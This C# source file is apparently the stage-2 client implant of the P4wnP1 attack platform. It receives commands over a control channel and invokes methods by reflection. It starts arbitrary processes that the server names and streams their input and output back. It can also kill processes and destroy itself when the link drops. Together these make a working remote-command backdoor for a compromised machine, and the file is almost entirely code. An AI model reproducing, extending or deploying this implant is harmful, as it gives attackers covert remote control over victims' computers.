using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace P4wnP1
{
    public class Client
    {
        // message types from CLIENT (powershell) to server (python)
        const UInt32 CTRL_MSG_FROM_CLIENT_RESERVED = 0;
        const UInt32 CTRL_MSG_FROM_CLIENT_REQ_STAGE2 = 1;
        const UInt32 CTRL_MSG_FROM_CLIENT_RCVD_STAGE2 = 2;
        public const UInt32 CTRL_MSG_FROM_CLIENT_STAGE2_RUNNING = 3;
        const UInt32 CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE = 4;
        const UInt32 CTRL_MSG_FROM_CLIENT_ADD_CHANNEL = 5;
        const UInt32 CTRL_MSG_FROM_CLIENT_RUN_METHOD = 6;// client tasks server to run a method
        const UInt32 CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE = 7;
        const UInt32 CTRL_MSG_FROM_CLIENT_PROCESS_EXITED = 8;

        // message types from server (python) to client (powershell)
        const UInt32 CTRL_MSG_FROM_SERVER_STAGE2_RESPONSE = 1000;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_OS_INFO = 1001;
        const UInt32 CTRL_MSG_FROM_SERVER_SEND_PS_VERSION = 1002;
        const UInt32 CTRL_MSG_FROM_SERVER_RUN_METHOD = 1003;
        const UInt32 CTRL_MSG_FROM_SERVER_ADD_CHANNEL_RESPONSE = 1004;
        const UInt32 CTRL_MSG_FROM_SERVER_RUN_METHOD_RESPONSE = 1005; // response from a method ran on server
        const UInt32 CTRL_MSG_FROM_SERVER_DESTROY = 1006;


        private TransportLayer tl;
        private Hashtable pending_method_calls;
        private Object pendingMethodCallsLock;
        

        private Hashtable pending_client_processes;
        private Object pendingClientProcessesLock;
        List<ClientProcess> exitedProcesses;
        private Object exitedProcessesLock;

        private bool running;
        private Thread inputProcessingThread;
        private Thread outputProcessingThread;

        private AutoResetEvent eventDataNeedsToBeProcessed;

        public Client(TransportLayer tl)
        {
            this.tl = tl;
            
            this.pending_client_processes = Hashtable.Synchronized(new Hashtable());
            this.pendingClientProcessesLock = new object();
            this.exitedProcesses = new List<ClientProcess>();
            this.exitedProcessesLock = new object();

            this.pending_method_calls = Hashtable.Synchronized(new Hashtable());
            this.pendingMethodCallsLock = new object();

            this.running = true;
            this.eventDataNeedsToBeProcessed = new AutoResetEvent(true);

            this.tl.registerTimeoutCallback(this.linklayerTimeoutHandler);
        }

        public void linklayerTimeoutHandler(long dt)
        {
            Console.WriteLine(String.Format("LinkLayer timeout {0}", dt));

            //Self destroy
            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE);
            this.stop();
        }

        public void stop()
        {
            this.running = false;
            this.tl.stop();

            //abort threads if still running
            this.inputProcessingThread.Abort();
            this.outputProcessingThread.Abort();

        }

        public void SendControlMessage(UInt32 msg_type)
        {
            SendControlMessage(msg_type, null);
        }

        public void SendControlMessage(UInt32 msg_type, byte[] data)
        {
            List<byte> msg = Struct.packUInt32(msg_type);
            if (data != null) msg = Struct.packByteArray(data, msg);

            this.tl.WriteControlChannel(msg.ToArray());
        }

        private void setProcessingNeeded(bool needed)
        {
            if (needed) this.eventDataNeedsToBeProcessed.Set();
            else this.eventDataNeedsToBeProcessed.Reset(); // this shouldn't be used, only the processing thread should be allowed to reset the signal
        }

        private void addRequestedClientMethodToQueue(ClientMethod method)
        {
            Monitor.Enter(this.pendingMethodCallsLock);
            this.pending_method_calls[method.id] = method;
            Monitor.Exit(this.pendingMethodCallsLock);
            this.setProcessingNeeded(true);
        }

        private void onProcessExit(ClientProcess cproc)
        {
            Monitor.Enter(this.exitedProcessesLock);
            this.exitedProcesses.Add(cproc);
            this.setProcessingNeeded(true);
            Console.WriteLine(String.Format("Proc with id {0} and filename '{1}' exited.", cproc.Id, cproc.proc_filename));
            Monitor.Exit(this.exitedProcessesLock);
        }

        private void __processInput()
        {
            //For now only input of control channel has to be delivered
            // Input for ProcessChannels (STDIN) is directly written to the STDIN pipe of the process (when TransportLayer enqueues data)

            Channel control_channel = this.tl.GetChannel(0);
            while (this.running)
            {
                this.tl.ProcessInSingle(true); // blocks if no input from transport layer

                /*
                 * read and process control channel data
                 */
                while (control_channel.hasPendingInData())
                {
                    List<byte> data = Struct.packByteArray(control_channel.read());

                    // extract control message type
                    UInt32 CtrlMessageType = Struct.extractUInt32(data);

                    switch (CtrlMessageType)
                    {
                        case CTRL_MSG_FROM_SERVER_RUN_METHOD:
                            ClientMethod new_method = new ClientMethod(data);
                            this.addRequestedClientMethodToQueue(new_method);

                            Console.WriteLine(String.Format("Received control message RUN_METHOD! Method ID: {0}, Method Name: {1}, Method Args: {2}", new_method.id, new_method.name, new_method.args));
                            break;

                        case CTRL_MSG_FROM_SERVER_DESTROY:
                            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_DESTROY_RESPONSE);
                            this.stop();
                            break;

                        default:
                            String data_utf8 = Encoding.UTF8.GetString(data.ToArray());
                            Console.WriteLine(String.Format("Received unknown MESSAGE TYPE for control channel! MessageType: {0}, Data: {1}", CtrlMessageType, data_utf8));
                            break;
                    }
                }
            }
        }

        private void __processOutput()
        {
            while (this.running)
            {
                this.tl.ProcessOutSingle(true);
            }
        }

        private void debugServerMethodTest()
        {
            //DEBUG test for method creation by client on server
            List<byte> method_request = Struct.packUInt32(1); // method ID
            method_request = Struct.packNullTerminatedString("test_method_call_from_client", method_request);
            method_request = Struct.packByteArray(new byte[] { 0, 1, 2, 3 }, method_request);

            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_RUN_METHOD, method_request.ToArray());
            //end DEBUG test for method creation by client on server

        }

        public void run()
        {
            
            List<UInt32> method_remove_list = new List<UInt32>();

            // Delete this after testing
            this.debugServerMethodTest();
            
            //start input thread
            this.inputProcessingThread = new Thread(new ThreadStart(this.__processInput));
            this.inputProcessingThread.Start();

            this.outputProcessingThread = new Thread(new ThreadStart(this.__processOutput));
            this.outputProcessingThread.Start();

            

            while (this.running)
            {
                //this.tl.ProcessInSingle(false);

                //stop processing until sgnal is received
                while (true)
                {
                    if (this.eventDataNeedsToBeProcessed.WaitOne(100) || (!running)) break;
                }

                //re-check if we are still running (eraly out)
                if (!running) break;


                /*
                 * remove exited processes
                 */
                Monitor.Enter(this.exitedProcessesLock);
                foreach (ClientProcess cproc in this.exitedProcesses)
                {
                    Monitor.Enter(this.pendingClientProcessesLock);
                    this.pending_client_processes.Remove(cproc.Id);
                    Monitor.Exit(this.pendingClientProcessesLock);

                    //ToDo: inform client about process removement
                    this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_PROCESS_EXITED, (Struct.packUInt32((UInt32) cproc.Id)).ToArray());

                    //ToDo: destroy channels and inform client
                }
                this.exitedProcesses.Clear();
                Monitor.Exit(this.exitedProcessesLock);

                /*
                 * Process running methods
                 */
                Monitor.Enter(this.pendingMethodCallsLock);

                ICollection method_ids = this.pending_method_calls.Keys;
                foreach (UInt32 method_id in method_ids)
                {
                    if (this.pending_method_calls.ContainsKey(method_id)) //we have to recheck if the method still exists in every iteration
                    {
                        ClientMethod method = (ClientMethod) this.pending_method_calls[method_id];


                        //check if method has been started, do it if not
                        if (!method.started)
                        {
                            //find method implementation
                            MethodInfo method_implementation = this.GetType().GetMethod(method.name, BindingFlags.NonPublic | BindingFlags.Instance);
                            
                            if (method_implementation != null)
                            {
                                try
                                {
                                    byte[] method_result = (byte[])method_implementation.Invoke(this, new Object[] { method.args });
                                    method.setResult(method_result);
                                }
                                catch (ClientMethodException e)
                                {
                                    method.setError(String.Format("Method '{0}' throwed error:\n{1}", method.name, e.Message));
                                }
                                catch (Exception e)
                                {
                                    method.setError(String.Format("Method '{0}' found, but calling results in following exception:\n{1}", method.name, e.InnerException.Message));
                                    Console.WriteLine("Catch block of Method invocation");
                                }
                                
                            }
                            else
                            {
                                
                                method.setError(String.Format("Method '{0}' not found!", method.name));
                            }
                            
                        }

                        if (method.finished)
                        {
                            //Enqueue response and remove method from pending ones
                            byte[] response = method.createResponse();
                            this.SendControlMessage(Client.CTRL_MSG_FROM_CLIENT_RUN_METHOD_RESPONSE, response);
                            //this.pending_method_calls.Remove(method_id);

                            //add method to remove list
                            method_remove_list.Add(method_id);
                        }

                    }
                }
                Monitor.Exit(this.pendingMethodCallsLock);

                //remove finished methods
                Monitor.Enter(this.pendingMethodCallsLock);
                foreach (UInt32 method_id in method_remove_list) this.pending_method_calls.Remove(method_id);
                Monitor.Exit(this.pendingMethodCallsLock);


            }
        }

        /*
         * ChannelAddRequest
         *      0..3    UInt32  Channel ID
         *      4       byte    Channel Class (0 = unspecified, 1 = ProcessChannel, ...)
         *      5       byte    Channel Type (0 = unspecified, 1 = BIDIRECTIONAL, 2 = OUT, 3 = IN) Note: channel type has to be reversed on other endpoit IN becomes OUT, OUT becomes in
         *      6       byte    Channel Encoding (0 = unspecified, 1 = BYTEARRAY, 2 = UTF8)
         *      7..10   UInt32  Channel parent ID (0= unspecified, in case of process channel process ID)
         *      11..14  UInt32  Channel subtype  (in case of process: 0=STDIN, 1=STDOUT, 2=STDERR)
         */
        /*
        private void sendChannelAddRequest(Channel ch)
        {

            if (ch is ProcessChannel)
            {
                ProcessChannel p_ch = (ProcessChannel)ch;

                List<byte> chAddRequest = Struct.packUInt32(p_ch.ID);

                chAddRequest = Struct.packByte(1, chAddRequest);

                if (p_ch.type == Channel.Types.BIDIRECTIONAL) chAddRequest = Struct.packByte(1, chAddRequest);
                else if (p_ch.type == Channel.Types.IN) chAddRequest = Struct.packByte(2, chAddRequest); //set to out on other end
                else if (p_ch.type == Channel.Types.OUT) chAddRequest = Struct.packByte(3, chAddRequest); //set to in on other end
                else chAddRequest = Struct.packByte(0, chAddRequest); //unspecified

                if (p_ch.encoding == Channel.Encodings.BYTEARRAY) chAddRequest = Struct.packByte(1, chAddRequest); //set to BYTEARRAY encoding
                else if (p_ch.encoding == Channel.Encodings.UTF8) chAddRequest = Struct.packByte(2, chAddRequest); //set to UTF-8 encoding
                else chAddRequest = Struct.packByte(0, chAddRequest); //set to unspecified encoding

                

            }
            else
            {
                Console.WriteLine("undefined channel");
            }

        }
        */

        private byte[] core_inform_channel_added(byte[] args)
        {
            UInt32 ch_id = Struct.extractUInt32(new List<byte>(args));
            ((Channel)this.tl.GetChannel(ch_id)).isLinked = true;
            return Struct.packNullTerminatedString(String.Format("Channel with ID {0} set to 'hasLink'", ch_id)).ToArray();
        }

        private byte[] core_kill_proc(byte[] args)
        {
            UInt32 proc_id = Struct.extractUInt32(new List<byte>(args));
            //check if proc ID exists (for now only managed procs)
            if (this.pending_client_processes.Contains((int)proc_id))
            {
                ((ClientProcess)this.pending_client_processes[(int)proc_id]).kill();
                //return Struct.packNullTerminatedString(String.Format("Sent kill signal to process with ID {0}", proc_id)).ToArray();
                return Struct.packUInt32(proc_id).ToArray(); // return process id on success
            }
            else
            {
                throw new ClientMethodException(String.Format("Process with ID {0} not known. Kill signal hasn't been sent", proc_id));
                //return Struct.packNullTerminatedString(String.Format("Process with ID {0} not known. Kill signal hasn't been sent", proc_id)).ToArray();
            }

        }

        private byte[] core_create_proc(byte[] args)
        {
            List<byte> data = new List<byte>(args);

            // first byte indicates if STDIN, STDOUT and STDERR should be streamed to channels
            bool use_channels = (Struct.extractByte(data) != 0);
            string proc_filename = Struct.extractNullTerminatedString(data);
            string proc_args = Struct.extractNullTerminatedString(data);

            ClientProcess proc = new ClientProcess(proc_filename, proc_args, use_channels, this.tl.setOutputProcessingNeeded); //starts the process already
            proc.registerOnExitCallback(this.onProcessExit);

            
            if (use_channels)
            {
                this.tl.AddChannel(proc.Ch_stdin);
                this.tl.AddChannel(proc.Ch_stdout);
                this.tl.AddChannel(proc.Ch_stderr);

                
                /*
                proc.Ch_stdin = this.tl.CreateChannel(Channel.Types.IN, Channel.Encodings.UTF8);
                proc.Ch_stdout = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                proc.Ch_stderr = this.tl.CreateChannel(Channel.Types.OUT, Channel.Encodings.UTF8);
                */
            }
            

            

            //generate method response
            List <byte> resp = Struct.packUInt32((UInt32) proc.Id);
            if (use_channels)
            {
                resp = Struct.packByte(1, resp);
                resp = Struct.packUInt32(proc.Ch_stdin.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stdout.ID, resp);
                resp = Struct.packUInt32(proc.Ch_stderr.ID, resp);
            }
            else
            {
                resp = Struct.packByte(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
                resp = Struct.packUInt32(0, resp);
            }

            Monitor.Enter(this.pendingClientProcessesLock);
            this.pending_client_processes.Add(proc.Id, proc);
            Monitor.Exit(this.pendingClientProcessesLock);

            //throw new ClientMethodException(String.Format("Not implemented: Trying to start proc '{0}' with args: {1}", proc_filename, proc_args));
            return resp.ToArray();
        }

        private byte[] core_echo(byte[] args)
        {
            return args;
        }
    }
}
